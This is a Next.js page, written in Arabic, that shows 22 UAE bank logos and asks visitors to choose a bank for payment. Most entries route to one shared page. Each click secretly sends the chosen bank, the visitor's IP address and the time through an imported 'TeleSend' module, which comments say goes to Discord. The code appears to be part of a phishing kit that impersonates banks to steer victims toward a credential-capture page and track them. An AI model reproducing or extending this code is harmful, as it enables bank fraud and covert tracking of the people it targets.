'use client'

import React, { useState, useEffect } from "react";
import { useRouter } from 'next/navigation';
import Image from "next/image";
import TeleSned from "../../../server/TeleSend";

const Page = () => {
  const router = useRouter();
  const { Send } = TeleSned();
  const [ip, setIp] = useState('جاري التحميل...');

  // جلب IP من API
  useEffect(() => {
    const fetchIp = async () => {
      try {
        const response = await fetch('/api/ip');
        const data = await response.json();
        setIp(data.ip);
      } catch (error) {
        console.error('خطأ في جلب IP:', error);
        setIp('غير متاح');
      }
    };
    fetchIp();
  }, []);
  const banks = [
    { id: 1, name: 'بنك أبو ظبي التجاري', src: '/b-abodabetgare.jfif',url:'/payment/banks/bankaz' },
    { id: 2, name: 'بنك أبو ظبي الأول', src: '/b-abodabeone.jpg',url:'/payment/banks/bankaz'},
    { id: 3, name: 'بنك الإمارات الإسلامي', src: '/b-emaratislam.png',url:'/payment/banks/bankaz' },
    { id: 4, name: 'بنك الإمارات دبي الوطني', src: '/b-emaratdubaiwatne.jpg',url:'/payment/banks/bankaz' },
    { id: 5, name: 'بنك دبي التجاري', src: '/b-dubaitgare.jpg',url:'/payment/banks/bankaz' },
    { id: 6, name: 'بنك أبو ظبي الإسلامي', src: '/b-abodabeislam.jpg',url:'/payment/banks/bankaz' },
    { id: 7, name: 'بنك المشرق', src: '/b-mahrok.png',url:'/payment/banks/bankaz'  },
    { id: 8, name: 'بنك دبي الإسلامي', src: '/b-dubaiislam.jpg',url:'/payment/banks/bankaz'  },
    { id: 9, name: 'HSBC بنك', src: '/bhsbc.png',url:'/payment/banks/bankaz'  },
    { id: 10, name: 'مصرف الشارقة الإسلامي', src: '/msrfsharka.jfif',url:'/payment/banks/bankaz' },
    { id: 11, name: 'بنك رأس الخيمة الوطني', src: '/b-raskema.gif',url:'/payment/banks/bankaz' },
    { id: 12, name: 'بنك الفجيرة الوطني', src: '/b-fgerwatny.jpg',url:'/payment/banks/bankaz' },
    { id: 13, name: 'بنك الاستثمار', src: '/bank-investment.jpg',url:'/payment/banks/bankaz' },
    { id: 14, name: 'بنك أم القيوين الوطني', src: '/b.jpg',url:'/payment/banks/bankaz' },
    { id: 15, name: 'بنك الماريا المحلي', src: '/bmarea.jpg',url:'/payment/banks/bankaz' },
    { id: 16, name: 'بنك الهلال', src: '/bank-hilal.jpg',url:'/payment/banks/bankaz' },
    { id: 17, name: 'Wio Bank', src: '/wiob.webp',url:'/payment/bankaz' },
    { id: 18, name: 'المصرف', src: '/bank-al-masraf.jpg',url:'/payment/banks/bankaz' },
    { id: 19, name: 'بنك عجمان', src: '/bajman.jpg',url:'/payment/bankaz' },
    { id: 20, name: 'بنك الشارقة', src: '/bank-sharjah.jpg',url:'/payment/banks/bankaz' },
    { id: 21, name: 'Liv X', src: '/livexb.jfif',url:'/payment/banks/bankaz' },
    { id: 22, name: 'Zand Bank', src: '/bank-zand.jpg',url:'/payment/banks/bankaz' }

  ];
  const handleBankClick = (bankUrl, bankName, bankId) => {
    // إرسال البيانات إلى Discord
    const sendToDiscord = async () => {
      try {
        const description = `🏦 **اختيار البنك**\n\n` +
                           `📌 **البنك المختار:** ${bankName}\n` +
                           `🔍 **رقم البنك:** ${bankId}\n` +
                           `🌐 **IP المستخدم:** ${ip}\n` +
                           `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
        
        Send(description);
        console.log('✅ تم إرسال بيانات البنك إلى Discord');
      } catch (error) {
        console.error('❌ خطأ في الإرسال إلى Discord:', error);
      }
    };

    sendToDiscord();
    
    // التوجيه إلى صفحة البنك مع إضافة Query Parameters
    router.push(`${bankUrl}?bankId=${bankId}&bankName=${encodeURIComponent(bankName)}&ip=${encodeURIComponent(ip)}`);
  };

  return (
    <main className="flex min-h-screen flex-col items-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
      <div className="z-10 w-full max-w-4xl mx-auto">
        {/* العنوان */}
        <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mb-6">
          <h1 className="text-2xl md:text-3xl font-bold text-[#800000] text-center">
            اختر البنك الخاص بك للدفع
          </h1>
          <p className="text-gray-600 mt-2 text-center text-sm md:text-base">
            يرجى اختيار البنك الذي ترغب في الدفع من خلاله
          </p>
        </div>

        {/* شبكة البنوك */}
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4 md:gap-6">
          {banks.map((bank) => (
            <div
              key={bank.id}
              onClick={() => handleBankClick(bank.url, bank.name, bank.id)}
              className="flex flex-col items-center justify-center bg-white rounded-xl shadow-md hover:shadow-2xl transition-all duration-300 transform hover:scale-105 cursor-pointer p-4 md:p-6 border border-gray-100 hover:border-[#800000]"
            >
              {/* شعار البنك */}
              <div className="w-20 h-20 md:w-24 md:h-24 relative rounded-full overflow-hidden bg-gray-50 flex items-center justify-center">
                <Image
                  src={bank.src}
                  alt={bank.name}
                  width={80}
                  height={80}
                  className="object-contain p-2"
                  onError={(e) => {
                    e.target.src = '/bank-placeholder.png';
                  }}
                />
              </div>
              {/* اسم البنك */}
              <p className="text-sm md:text-base font-semibold text-gray-700 mt-3 text-center leading-tight">
                {bank.name}
              </p>
            </div>
          ))}
        </div>

        {/* زر العودة */}
        <div className="mt-8 text-center">
          <button
            onClick={() => router.back()}
            className="px-6 py-2 text-gray-600 hover:text-[#800000] transition-colors duration-200"
          >
            ← العودة
          </button>
        </div>
      </div>
    </main>
  );
};

export default Page;